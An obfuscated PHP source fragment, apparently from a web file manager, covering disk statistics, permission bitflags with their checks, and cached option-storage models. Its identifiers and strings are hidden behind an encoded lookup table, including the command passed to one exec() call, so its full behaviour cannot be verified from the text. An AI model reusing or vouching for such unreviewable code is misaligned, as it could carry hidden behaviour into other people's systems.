$Ù²“æÚÕ = $ÒÄ”Š‡ª[2107] . ($Ü•¹±Îğ ? $ÒÄ”Š‡ª[8] . $Ü•¹±Îğ : $ÒÄ”Š‡ª[12]); } $Äìúü = $GLOBALS[$ÒÄ”Š‡ª[6]][$ÒÄ”Š‡ª[425]][$ÒÄ”Š‡ª[918]]; return array($ÒÄ”Š‡ª[2108] => $¨üçíÕ ? $¨üçíÕ[$ÒÄ”Š‡ª[2109]] : 0, $ÒÄ”Š‡ª[2110] => $¨üçíÕ ? $¨üçíÕ[$ÒÄ”Š‡ª[2111]] : 0, $ÒÄ”Š‡ª[2112] => (int) $İõËÙ­«[$ÒÄ”Š‡ª[2109]] * 1024 * 1024 * 1024, $ÒÄ”Š‡ª[2113] => (int) $¥ƒ½„ò, $ÒÄ”Š‡ª[2114] => ucfirst($¸òï³ËŠ), $ÒÄ”Š‡ª[2115] => $ÒÄ”Š‡ª[2116] . PHP_VERSION, $ÒÄ”Š‡ª[2117] => phpBuild64() ? 64 : 32, $ÒÄ”Š‡ª[841] => str_replace($ÒÄ”Š‡ª[1241], $ÒÄ”Š‡ª[1095], $Ù²“æÚÕ), $ÒÄ”Š‡ª[425] => ucfirst($Äìúü), $ÒÄ”Š‡ª[32] => $_SERVER[$ÒÄ”Š‡ª[2118]]); } private function diskDriver() { $æ‚â‚Ñ =& $_SERVER[¿ÈˆÑ¸ä]; $º¤™¨ = $æ‚â‚Ñ[8]; $é­ôü¨ó = $GLOBALS[$æ‚â‚Ñ[6]][$æ‚â‚Ñ[1433]] == $æ‚â‚Ñ[1434]; if ($é­ôü¨ó) { $º¤™¨ = $æ‚â‚Ñ[2119]; if (function_exists($æ‚â‚Ñ[2120])) { exec($æ‚â‚Ñ[2121], $ÛÙàôÀä); $º¤™¨ = $ÛÙàôÀä[1] . $æ‚â‚Ñ[8]; } } if (!file_exists($º¤™¨)) { return; } if (!function_exists($æ‚â‚Ñ[2122])) { return; } $î÷ºÙ¼ = @disk_total_space($º¤™¨); $“ÁÈ‡ğë = $î÷ºÙ¼ - @disk_free_space($º¤™¨); return array($æ‚â‚Ñ[2109] => $î÷ºÙ¼, $æ‚â‚Ñ[2111] => $“ÁÈ‡ğë); } public function fileChart($†¯É’â) { $‡ÓŸÛĞ =& $_SERVER[¿ÈˆÑ¸ä]; if (isset($†¯É’â[$‡ÓŸÛĞ[1529]])) { return Model($‡ÓŸÛĞ[916])->userFileTypeProfile($†¯É’â[$‡ÓŸÛĞ[1529]]); } if (isset($†¯É’â[$‡ÓŸÛĞ[1431]])) { return Model($‡ÓŸÛĞ[916])->groupFileTypeProfile($†¯É’â[$‡ÓŸÛĞ[1431]]); } $¿íÎìÏË = $this->sourceSize(); $é’¦•ü = array($‡ÓŸÛĞ[191] => 0, $‡ÓŸÛĞ[189] => 1); $ß÷ÉğĞã = Model($‡ÓŸÛĞ[916])->where($é’¦•ü)->sum($‡ÓŸÛĞ[79]); $é’¦•ü[$‡ÓŸÛĞ[189]] = 2; $™£œÌÏÆ = Model($‡ÓŸÛĞ[916])->where($é’¦•ü)->sum($‡ÓŸÛĞ[79]); return array($‡ÓŸÛĞ[847] => $¿íÎìÏË[$‡ÓŸÛĞ[79]], $‡ÓŸÛĞ[2059] => $¿íÎìÏË[$‡ÓŸÛĞ[2059]], $‡ÓŸÛĞ[2060] => (int) $ß÷ÉğĞã, $‡ÓŸÛĞ[2061] => (int) $™£œÌÏÆ); } private function sourceSize() { $¼ôÎ×Ê• =& $_SERVER[¿ÈˆÑ¸ä]; $È§û ›Ğ = Model($¼ôÎ×Ê•[916])->where(array($¼ôÎ×Ê•[496] => 0))->sum($¼ôÎ×Ê•[79]); $¼ßãíÊé = Model($¼ôÎ×Ê•[556])->sum($¼ôÎ×Ê•[79]); if ($¼ßãíÊé > $È§û ›Ğ) { $¼ßãíÊé = $È§û ›Ğ; } return array($¼ôÎ×Ê•[79] => (int) $È§û ›Ğ, $¼ôÎ×Ê•[2059] => (int) $¼ßãíÊé); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Í÷ÜúÁÉ =& $_SERVER[¿ÈˆÑ¸ä]; $ˆ½Ô²óÌ = array(array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2123]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2125], $Í÷ÜúÁÉ[2126] => 1, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2129]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2130], $Í÷ÜúÁÉ[2126] => 2, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2131]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2132], $Í÷ÜúÁÉ[2126] => 3, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2133]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2134], $Í÷ÜúÁÉ[2126] => 4, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => self::AUTH_SHOW | self::AUTH_VIEW), array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2135]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2136], $Í÷ÜúÁÉ[2126] => 5, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2137]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2138], $Í÷ÜúÁÉ[2126] => 6, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Í÷ÜúÁÉ[505] => LNG($Í÷ÜúÁÉ[2139]), $Í÷ÜúÁÉ[2124] => $Í÷ÜúÁÉ[2140], $Í÷ÜúÁÉ[2126] => 7, $Í÷ÜúÁÉ[2127] => 1, $Í÷ÜúÁÉ[2128] => 0)); return $ˆ½Ô²óÌ; } public static function authCheck($«ÜôÇÅ, $¹ÀÎáÒ°, $€ê–€÷Á = true) { $ËóµÜ =& $_SERVER[¿ÈˆÑ¸ä]; $«ÜôÇÅ = intval($«ÜôÇÅ); if ($€ê–€÷Á) { if (KodUser::isRoot() && $GLOBALS[$ËóµÜ[6]][$ËóµÜ[2141]]) { return !0; } } if ($«ÜôÇÅ <= 0) { return !1; } if (($«ÜôÇÅ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($«ÜôÇÅ & $¹ÀÎáÒ°); } public static function authCheckShow($¢ãííÏ¤) { return self::authCheck($¢ãííÏ¤, self::AUTH_SHOW); } public static function authCheckView($Åğ¸äÊ¶) { return self::authCheck($Åğ¸äÊ¶, self::AUTH_VIEW); } public static function authCheckDownload($É©´ûÖÆ) { return self::authCheck($É©´ûÖÆ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ã·óå) { return self::authCheck($Ã·óå, self::AUTH_UPLOAD); } public static function authCheckEdit($¨Ï‰™„Ş) { return self::authCheck($¨Ï‰™„Ş, self::AUTH_EDIT); } public static function authCheckRemove($üœ‰ÎÄ) { return self::authCheck($üœ‰ÎÄ, self::AUTH_REMOVE); } public static function authCheckShare($ÙÒ¤¸´Ç) { return self::authCheck($ÙÒ¤¸´Ç, self::AUTH_SHARE); } public static function authCheckComment($‘¦üìÉê) { return self::authCheck($‘¦üìÉê, self::AUTH_COMMENT); } public static function authCheckEvent($ÁšŒ´¡ ) { return self::authCheck($ÁšŒ´¡ , self::AUTH_EVENT); } public static function authCheckRoot($¨« ª·Ï) { return self::authCheck($¨« ª·Ï, self::AUTH_ROOT); } public static function authCheckAction($†úûçÛ‘, $·ËÓÕ¸•) { $íÀË =& $_SERVER[¿ÈˆÑ¸ä]; $úƒ•±ª = array($íÀË[1496] => self::AUTH_SHOW, $íÀË[1497] => self::AUTH_VIEW, $íÀË[1318] => self::AUTH_DOWNLOAD, $íÀË[108] => self::AUTH_UPLOAD, $íÀË[1498] => self::AUTH_EDIT, $íÀË[1267] => self::AUTH_REMOVE, $íÀË[1499] => self::AUTH_SHARE, $íÀË[430] => self::AUTH_COMMENT, $íÀË[1500] => self::AUTH_EVENT, $íÀË[1501] => self::AUTH_ROOT); if (!isset($úƒ•±ª[$·ËÓÕ¸•])) { return; } $¢‘”÷ß„ = $úƒ•±ª[$·ËÓÕ¸•]; $†úûçÛ‘ = intval($†úûçÛ‘); if ($†úûçÛ‘ <= 0) { return !1; } if (($†úûçÛ‘ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($†úûçÛ‘ & $¢‘”÷ß„); } public static function authDisable($ˆó²µ‚®, $ÌæŸéöû) { if (intval($ˆó²µ‚®) <= 0) { return 0; } return intval($ˆó²µ‚®) & ~$ÌæŸéöû; } public $optionType = "\123\171\x73\x74\x65\155\x2e\x73\x6f\165\x72\143\x65\101\165\x74\x68\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x61\165\x74\150", "\154\x61\142\145\x6c", "\144\x69\x73\160\x6c\x61\x79", "\x73\171\163\x74\145\x6d", "\163\157\162\x74"); public function initData() { $Ô¬È§à­ = $this->authDefault(); foreach ($Ô¬È§à­ as $îºßş‘§) { $this->add($îºßş‘§); } } public function findAuth($«Ş×æ’¿, $Ö×ìƒËĞ) { $º¸ßÊ¨Ÿ =& $_SERVER[¿ÈˆÑ¸ä]; $›ò°±Úò = parent::listData(); foreach ($›ò°±Úò as $¢Ù±¥´Š) { $…ˆå¤ƒê = intval($¢Ù±¥´Š[$º¸ßÊ¨Ÿ[498]]); if ($…ˆå¤ƒê <= 0 || $¢Ù±¥´Š[$º¸ßÊ¨Ÿ[2142]] == 0) { continue; } if (($…ˆå¤ƒê & $«Ş×æ’¿) != $«Ş×æ’¿) { continue; } if (($…ˆå¤ƒê & $Ö×ìƒËĞ) != 0) { continue; } return $¢Ù±¥´Š[$º¸ßÊ¨Ÿ[483]]; } return !1; } public function findAuthMax($’ëÄõøÍ, $ã¿®Ã¥) { $øÈ¨œÑÆ =& $_SERVER[¿ÈˆÑ¸ä]; $”œ¤Í°Ì = !1; $‹«“ì = parent::listData(); foreach ($‹«“ì as $ÌÃ°¦³½) { $«¤Íá©è = intval($ÌÃ°¦³½[$øÈ¨œÑÆ[498]]); if ($«¤Íá©è <= 0 || $ÌÃ°¦³½[$øÈ¨œÑÆ[2142]] == 0) { continue; } if (($«¤Íá©è & $’ëÄõøÍ) != $’ëÄõøÍ) { continue; } if (($«¤Íá©è & $ã¿®Ã¥) != 0) { continue; } if (!$”œ¤Í°Ì) { $”œ¤Í°Ì = $ÌÃ°¦³½; continue; } if (intval($”œ¤Í°Ì[$øÈ¨œÑÆ[498]]) < $«¤Íá©è) { $”œ¤Í°Ì = $ÌÃ°¦³½; } } return $”œ¤Í°Ì ? $”œ¤Í°Ì[$øÈ¨œÑÆ[483]] : !1; } public function findAuthReadOnly() { $ªšéÃ†Ò = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $…Á›ñï = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ªšéÃ†Ò, $…Á›ñï); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $«Œ¹Ô =& $_SERVER[¿ÈˆÑ¸ä]; $‚ú ä— = parent::listData(); $üé”¦ÑŠ = !1; foreach ($‚ú ä— as $Ê“Ü¥™è) { if ($Ê“Ü¥™è[$«Œ¹Ô[498]] <= 0 || $Ê“Ü¥™è[$«Œ¹Ô[2142]] == $«Œ¹Ô[229]) { continue; } if (!$üé”¦ÑŠ) { $üé”¦ÑŠ = $Ê“Ü¥™è; continue; } if ($üé”¦ÑŠ[$«Œ¹Ô[498]] > $Ê“Ü¥™è[$«Œ¹Ô[498]]) { $üé”¦ÑŠ = $Ê“Ü¥™è; } } return $üé”¦ÑŠ ? $üé”¦ÑŠ[$«Œ¹Ô[483]] : $«Œ¹Ô[12]; } public function listData($ÚŸ³Ê› = false, $æÁÛÛè¿ = "\x73\157\162\164", $ìÃûà±Ö = false) { return parent::listData($ÚŸ³Ê›, $æÁÛÛè¿, $ìÃûà±Ö); } public function update($´‰—Ú½‰, $—Õªê‚Ú) { $Ó±’šİ =& $_SERVER[¿ÈˆÑ¸ä]; $ºÆˆø¹• = parent::listData($´‰—Ú½‰); $ı¦¬¬ò = $this->findByName($—Õªê‚Ú[$Ó±’šİ[32]]); if (!$ºÆˆø¹• || $ı¦¬¬ò && $ı¦¬¬ò[$Ó±’šİ[483]] != $ºÆˆø¹•[$Ó±’šİ[483]]) { return !1; } $this->filterAuth($—Õªê‚Ú[$Ó±’šİ[498]]); return parent::update($´‰—Ú½‰, $—Õªê‚Ú); } public function remove($©»œ„ï¬) { $ÎËÇÕÔØ = parent::listData($©»œ„ï¬); if (!$ÎËÇÕÔØ || $ÎËÇÕÔØ[$_SERVER[¿ÈˆÑ¸ä][190]]) { return !1; } return parent::remove($©»œ„ï¬); } public function add($Ì’’öàı = array()) { $­ò›÷• =& $_SERVER[¿ÈˆÑ¸ä]; if ($this->findByName($Ì’’öàı[$­ò›÷•[32]])) { return !1; } $ëı¦×òá = array($­ò›÷•[32] => $­ò›÷•[12], $­ò›÷•[498] => 1, $­ò›÷•[2143] => $­ò›÷•[2132], $­ò›÷•[2142] => 1, $­ò›÷•[190] => 0, $­ò›÷•[2144] => 0); $Ì’’öàı = array_merge($ëı¦×òá, $Ì’’öàı); $Ì’’öàı[$­ò›÷•[2144]] = $this->getSort(); $this->filterAuth($Ì’’öàı[$­ò›÷•[498]]); return parent::insert($Ì’’öàı); } private function getSort() { $õÅê­ÁÌ =& $_SERVER[¿ÈˆÑ¸ä]; $£½‚åå‘ = parent::listData(); $ˆôá¢ßá = array_to_keyvalue($£½‚åå‘, $õÅê­ÁÌ[12], $õÅê­ÁÌ[2144]); return empty($ˆôá¢ßá) ? 0 : max($ˆôá¢ßá) + 1; } private function filterAuth(&$Š¶øçå) { if (!$Š¶øçå) { return; } $´¬ò¢Ò× = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ÂÃÏ©Ô = array(); foreach ($´¬ò¢Ò× as $‚½©˜ ¦) { if ($Š¶øçå & $‚½©˜ ¦) { $ÂÃÏ©Ô[] = $‚½©˜ ¦; } } if (in_array(self::AUTH_ROOT, $ÂÃÏ©Ô)) { $Š¶øçå = array_sum($´¬ò¢Ò×); return; } $€¬•ÖëÂ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ÂÃÏ©Ô as $‚½©˜ ¦) { if (isset($€¬•ÖëÂ[$‚½©˜ ¦])) { $ÂÃÏ©Ô = array_merge($ÂÃÏ©Ô, $€¬•ÖëÂ[$‚½©˜ ¦]); } } $ÂÃÏ©Ô[] = self::AUTH_SHOW; $Š¶øçå = array_sum(array_unique($ÂÃÏ©Ô)); } public function sort($¿½óÙµ„, $œÃÉ…³Ê) { return parent::update($¿½óÙµ„, $œÃÉ…³Ê); } } goto D÷”×Êğ; F¸‡‡ªÙš¾: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\x6d\x4f\x70\x74\x69\157\156"; public $field = array(); public function listData($…Ë•¿• = false, $ˆ††Âœß = "\155\157\x64\x69\146\171\x54\x69\155\145", $„šÛ¹¶ò = false) { $É–Õ³Êå =& $_SERVER[¿ÈˆÑ¸ä]; $Å¦±Ğêë = Model($this->modelType)->get(!1, $this->optionType, !0); $±•¹ï” = array_values($Å¦±Ğêë); if ($±•¹ï” && $±•¹ï”[0] && !is_array($±•¹ï”[0])) { Model($this->modelType)->cacheRemove($this->optionType); $Å¦±Ğêë = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$Å¦±Ğêë) { return $…Ë•¿• ? null : array(); } if (!$…Ë•¿• && $…Ë•¿• !== $É–Õ³Êå[229]) { $Å¦±Ğêë = array_filter(array_values($Å¦±Ğêë)); return array_sort_by($Å¦±Ğêë, $ˆ††Âœß, $„šÛ¹¶ò, $É–Õ³Êå[483]); } return $Å¦±Ğêë[$É–Õ³Êå[484] . $…Ë•¿•]; } public function insert($ßââÊÉ) { $®Ğ—··ô =& $_SERVER[¿ÈˆÑ¸ä]; $ßââÊÉ = array_field_key($ßââÊÉ, $this->field); $üÈÃÔ¾´ = Model($this->modelType)->get($®Ğ—··ô[485], $this->optionType . $®Ğ—··ô[486]); $üÈÃÔ¾´ = $üÈÃÔ¾´ ? $üÈÃÔ¾´ : 0; $ßââÊÉ[$®Ğ—··ô[483]] = ++$üÈÃÔ¾´; $ßââÊÉ[$®Ğ—··ô[232]] = time(); $ßââÊÉ[$®Ğ—··ô[88]] = time(); Model($this->modelType)->set($®Ğ—··ô[485], $üÈÃÔ¾´, $this->optionType . $®Ğ—··ô[486]); Model($this->modelType)->set($®Ğ—··ô[484] . $üÈÃÔ¾´, $ßââÊÉ, $this->optionType); return $üÈÃÔ¾´; } public function insertArr($ĞĞİÏ) { $Æ¸é³° =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ĞĞİÏ || !is_array($ĞĞİÏ)) { return !1; } $¾Ë·ñ¯‚ = Model($this->modelType)->get($Æ¸é³°[485], $this->optionType . $Æ¸é³°[486]); $¾Ë·ñ¯‚ = $¾Ë·ñ¯‚ ? $¾Ë·ñ¯‚ : 0; $²ãÕ­‰‡ = array(); foreach ($ĞĞİÏ as $­ÍöÆ¤) { $€ÈŞ÷ŸÒ = array_field_key($­ÍöÆ¤, $this->field); $€ÈŞ÷ŸÒ[$Æ¸é³°[483]] = ++$¾Ë·ñ¯‚; $€ÈŞ÷ŸÒ[$Æ¸é³°[232]] = time(); $€ÈŞ÷ŸÒ[$Æ¸é³°[88]] = time(); $²ãÕ­‰‡[$Æ¸é³°[484] . $¾Ë·ñ¯‚] = $€ÈŞ÷ŸÒ; } Model($this->modelType)->set($Æ¸é³°[485], $¾Ë·ñ¯‚, $this->optionType . $Æ¸é³°[486]); Model($this->modelType)->set($²ãÕ­‰‡, !1, $this->optionType); return $¾Ë·ñ¯‚; } public function update($‘ÒÌÏ¢, $§°êÈ¾¡) { $ò´…ìÇÊ =& $_SERVER[¿ÈˆÑ¸ä]; $§°êÈ¾¡ = array_field_key($§°êÈ¾¡, $this->field); $üÃ£Ù‘Ç = $this->listData($‘ÒÌÏ¢); if (!$üÃ£Ù‘Ç || !$‘ÒÌÏ¢) { return !1; } $§°êÈ¾¡ = array_merge($üÃ£Ù‘Ç, $§°êÈ¾¡); $§°êÈ¾¡[$ò´…ìÇÊ[88]] = time(); return Model($this->modelType)->set($ò´…ìÇÊ[484] . $‘ÒÌÏ¢, $§°êÈ¾¡, $this->optionType); } public function remove($üŞ±èª) { if (!$üŞ±èª) { return !1; } return Model($this->modelType)->remove($_SERVER[¿ÈˆÑ¸ä][484] . $üŞ±èª, $this->optionType); } public function removeArr($¹Šë¦·Æ) { if (!$¹Šë¦·Æ) { return !0; } $£˜œîö­ = array(); foreach ($¹Šë¦·Æ as $½‡œ™Ø‚) { $£˜œîö­[] = $_SERVER[¿ÈˆÑ¸ä][484] . $½‡œ™Ø‚; } return Model($this->modelType)->removeArr($£˜œîö­, $this->optionType); } public function clear() { $ÅŠ³Ø²ã =& $_SERVER[¿ÈˆÑ¸ä]; Model($this->modelType)->remove($ÅŠ³Ø²ã[485], $this->optionType . $ÅŠ³Ø²ã[486]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($×ôĞãû¸, $È‡îÇæ“) { if (!$È‡îÇæ“) { return !1; } $¿÷Í¡™¯ = $this->listData(); $¿÷Í¡™¯ = array_to_keyvalue($¿÷Í¡™¯, $×ôĞãû¸); return isset($¿÷Í¡™¯[$È‡îÇæ“]) ? $¿÷Í¡™¯[$È‡îÇæ“] : !1; } public function findByName($Ù±¾İ¼¥) { return $this->findByKey($_SERVER[¿ÈˆÑ¸ä][32], $Ù±¾İ¼¥); } protected function resetData($º´ùñÔ) { $Ü’™Ş ¬ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$º´ùñÔ) { return; } $º´ùñÔ = is_array($º´ùñÔ) ? $º´ùñÔ : array(); $ˆ”Ğ‚ƒ¥ = array(); for ($ï‘èÁ‚½ = 0; $ï‘èÁ‚½ < count($º´ùñÔ); $ï‘èÁ‚½++) { if (!$º´ùñÔ[$ï‘èÁ‚½] || !$º´ùñÔ[$ï‘èÁ‚½][$Ü’™Ş ¬[483]]) { continue; } $ˆ”Ğ‚ƒ¥[$Ü’™Ş ¬[484] . $º´ùñÔ[$ï‘èÁ‚½][$Ü’™Ş ¬[483]]] = $º´ùñÔ[$ï‘èÁ‚½]; } return Model($this->modelType)->set($ˆ”Ğ‚ƒ¥, !1, $this->optionType); } private function getAutoName($õë¡¿ø) { $ğøàÕ¥ = array_to_keyvalue($this->listData(), $_SERVER[¿ÈˆÑ¸ä][32]); if (!$ğøàÕ¥ || !isset($ğøàÕ¥[$õë¡¿ø])) { return $õë¡¿ø; } for ($—ÁÒ²åÌ = 1; $—ÁÒ²åÌ < count($ğøàÕ¥); $—ÁÒ²åÌ++) { $€ëÖª¼Ü = $õë¡¿ø . "\x28{$—ÁÒ²åÌ}\51"; if (!isset($ğøàÕ¥[$€ëÖª¼Ü])) { return $€ëÖª¼Ü; } } return $€ëÖª¼Ü; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ê˜î¡ = false, $šøÄÈş = '', $Êñòò = false, $¿ù¨¯Ş¼ = true) { $ä­Ğö°£ =& $_SERVER[¿ÈˆÑ¸ä]; $ªò«¾ğ‡ = $this->cacheGet($šøÄÈş); $‘şÇ§›ç = $this->optionDefault($šøÄÈş); $‘şÇ§›ç = is_array($‘şÇ§›ç) ? $‘şÇ§›ç : array(); if (is_array($ªò«¾ğ‡)) { if ($¿ù¨¯Ş¼) { $ªò«¾ğ‡ = array_merge($‘şÇ§›ç, $ªò«¾ğ‡); } return $ê˜î¡ ? isset($ªò«¾ğ‡[$ê˜î¡]) ? $ªò«¾ğ‡[$ê˜î¡] : null : $ªò«¾ğ‡; } $ë’ÒıÚÜ = $this->filterWhere(array($ä­Ğö°£[33] => $šøÄÈş)); $ªò«¾ğ‡ = $this->where($ë’ÒıÚÜ)->select(); $ªò«¾ğ‡ = array_to_keyvalue($ªò«¾ğ‡, $ä­Ğö°£[95], $ä­Ğö°£[451]); foreach ($ªò«¾ğ‡ as $Áø·‚îË => $Ñ×­İèÕ) { if ($Êñòò || in_array($Áø·‚îË, $this->jsonField)) { $ªò«¾ğ‡[$Áø·‚îË] = json_decode($Ñ×­İèÕ, !0); } } $this->cacheSet($šøÄÈş, $ªò«¾ğ‡); if ($¿ù¨¯Ş¼) { $ªò«¾ğ‡ = array_merge($‘şÇ§›ç, $ªò«¾ğ‡); } return $ê˜î¡ ? $ªò«¾ğ‡[$ê˜î¡] : $ªò«¾ğ‡; } public function set($â Ÿ†æÎ, $œğ¾„öí = false, $£ Öæ±æ = '') { $Òä¤ê‚ñ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$â Ÿ†æÎ) { return !0; } $©³¤øåÔ = $this->get(!1, $£ Öæ±æ, !1, !1); $©³¤øåÔ = is_array($©³¤øåÔ) ? $©³¤øåÔ : array(); $å†¡áœá = array(); $¼·«†»§ = array(); $ÉÙóó¡ò = array(); $€è—¼Å = is_array($â Ÿ†æÎ) ? $â Ÿ†æÎ : array($â Ÿ†æÎ => $œğ¾„öí); $ÒÕàÌª· = $this->filterWhere(array($Òä¤ê‚ñ[33] => $£ Öæ±æ)); foreach ($€è—¼Å as $Ò»²‰Öá => $¥¼½øÈ€) { if (is_array($¥¼½øÈ€)) { $¥¼½øÈ€ = json_encode_force($¥¼½øÈ€); } $this->checkLength($¥¼½øÈ€, !1, $this->tableName . $Òä¤ê‚ñ[4] . $â Ÿ†æÎ); $¥¼½øÈ€ = self::textEncode($¥¼½øÈ€); if (array_key_exists($Ò»²‰Öá, $©³¤øåÔ)) { $ıÙ¹…Õ = is_array($©³¤øåÔ[$Ò»²‰Öá]) ? json_encode_force($©³¤øåÔ[$Ò»²‰Öá]) : $©³¤øåÔ[$Ò»²‰Öá]; $ıÙ¹…Õ = self::textEncode($ıÙ¹…Õ); if ($ıÙ¹…Õ === $¥¼½øÈ€) { continue; } $¼·«†»§[] = array($Òä¤ê‚ñ[95], $Ò»²‰Öá, $Òä¤ê‚ñ[451], $¥¼½øÈ€, $Òä¤ê‚ñ[88], time()); } else { $¡ø”‚¡ô = array($Òä¤ê‚ñ[33] => $£ Öæ±æ, $Òä¤ê‚ñ[95] => $Ò»²‰Öá, $Òä¤ê‚ñ[451] => $¥¼½øÈ€); $å†¡áœá[] = $this->filterWhere($¡ø”‚¡ô); } } if (!$å†¡áœá && !$¼·«†»§) { return !0; } $this->cacheRemove($£ Öæ±æ); $‹Ù à = $this->cacheKey($Òä¤ê‚ñ[487]); CacheLock::lock($‹Ù à); if ($å†¡áœá) { $this->addAll($å†¡áœá); } if ($¼·«†»§) { $this->saveAll($¼·«†»§, $ÒÕàÌª·); } CacheLock::unlock($‹Ù à); return !0; } protected function optionDefault($œ§‚™äÖ = '') { return !1; } public function setDeep($±‚¹ØŠø, $ä¾¾‰Ø… = false, $ğâ´ƒ¹ = '') { $ÆğşÈ“Ë = explode($_SERVER[¿ÈˆÑ¸ä][10], $±‚¹ØŠø); $äƒœ’œÈ = $this->get(); array_set_value($äƒœ’œÈ, $±‚¹ØŠø, $ä¾¾‰Ø…); $this->set($ÆğşÈ“Ë[0], $äƒœ’œÈ[$ÆğşÈ“Ë[0]], $ğâ´ƒ¹); } public function remove($ã·ëÌ©î, $îíâßÅò = '') { $¡İ›Òµ¹ =& $_SERVER[¿ÈˆÑ¸ä]; $this->cacheRemove($îíâßÅò); $·š¶øÈ = $this->filterWhere(array($¡İ›Òµ¹[95] => $ã·ëÌ©î, $¡İ›Òµ¹[33] => $îíâßÅò)); if (is_null($ã·ëÌ©î)) { unset($·š¶øÈ[$¡İ›Òµ¹[95]]); } return $this->where($·š¶øÈ)->delete(); } public function removeArr($®ğª¬èõ, $µÈ©ıæà = '') { $‘˜£‚Ê¬ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$®ğª¬èõ || !is_array($®ğª¬èõ)) { return !0; } $this->cacheRemove($µÈ©ıæà); $£ŸÏ“íş = $this->filterWhere(array($‘˜£‚Ê¬[33] => $µÈ©ıæà, $‘˜£‚Ê¬[95] => array($‘˜£‚Ê¬[7], $®ğª¬èõ))); return $this->where($£ŸÏ“íş)->delete(); } public function cacheSet($òèÀÏùš, $©‚º‰ïŠ = false) { return Cache::set($this->cacheKey($òèÀÏùš), $©‚º‰ïŠ); } public function cacheGet($±äğ¹˜Ö) { return Cache::get($this->cacheKey($±äğ¹˜Ö)); } public function cacheRemove($Î– Œâ”) { return Cache::remove($this->cacheKey($Î– Œâ”)); } protected function filterWhere($¬ûñì) { return $¬ûñì; } protected function cacheKey($³¥¼”¾Ü) { return $³¥¼”¾Ü; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\143\145"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\x6d\x65" => "\151\x6f\x5f\163\157\x75\162\x63\145\137\x6d\145\x74\x61", "\155\x65\x74\141\106\151\145\x6c\144" => "\x73\x6f\x75\x72\143\145\x49\104"); protected $dataAuto = array(array("\155\x6f\144\151\x66\x79\x54\x69\155\x65", "\164\151\x6d\x65", "\x69\156\x73\145\162\164", 